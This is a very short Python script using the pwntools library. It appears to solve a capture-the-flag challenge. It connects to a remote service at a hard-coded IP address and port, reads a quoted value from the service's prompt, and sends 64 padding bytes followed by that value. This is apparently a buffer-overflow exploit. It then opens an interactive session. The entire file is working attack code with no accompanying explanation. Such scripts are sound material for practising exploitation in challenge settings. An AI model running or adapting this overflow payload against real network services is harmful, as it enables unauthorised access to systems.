from pwn import *

proc = remote("109.233.56.90", 11587)
s1 = proc.recvline()
s2 = proc.recvline()
s3 = proc.recvline().decode()
ans = s3.split("\'")[1]
proc.send(b"a"*16*4+ans.encode())
proc.interactive()
